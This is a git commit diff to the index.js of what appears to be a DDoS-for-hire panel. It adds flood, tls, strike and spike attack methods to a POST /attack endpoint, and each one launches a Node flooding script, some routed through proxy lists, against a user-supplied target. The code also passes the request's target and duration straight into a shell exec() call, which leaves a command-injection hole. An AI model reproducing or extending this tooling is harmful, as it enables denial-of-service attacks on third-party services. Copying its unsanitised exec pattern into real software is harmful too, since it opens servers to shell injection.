3c264c62d1d733843e6da79b8e6612b221d7ac51
Ridhzz <ridhzmemory@gmail.com>
2024-08-25 18:47:00 +0700

    Update index.js

--- index.js
+++ index.js
@@ -11,11 +11,27 @@ let ongoingAttacks = [];
 app.post('/attack', (req, res) => {
     const { target, duration, method } = req.body;
 
-    if (method !== 'gojo') {
-        return res.json({ success: false, message: 'Invalid method' });
-    }
+    let command;
 
-    const command = `node gojov5.js ${target} ${duration} 100 10 proxy.txt`;
+    switch (method) {
+        case 'gojo':
+            command = `node source/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
+            break;
+        case 'flood':
+            command = `node source/flood.js ${target} ${duration}`;
+            break;
+        case 'tls':
+            command = `node source/tls.js ${target} ${duration} 100 10`;
+            break;
+        case 'strike':
+            command = `node source/strike.js ${target} ${duration} 10 90 proxy.txt --full --legit`;
+            break;
+        case 'spike':
+            command = `node source/spike.js ${target} 10 ${duration}`;
+            break;
+        default:
+            return res.json({ success: false, message: 'Invalid method' });
+    }
 
     exec(command, (error, stdout, stderr) => {
         if (error) {
@@ -38,4 +54,4 @@ app.post('/attack', (req, res) => {
 
 app.listen(3000, () => {
     console.log('Server started on port 3000');
-}); 
+});
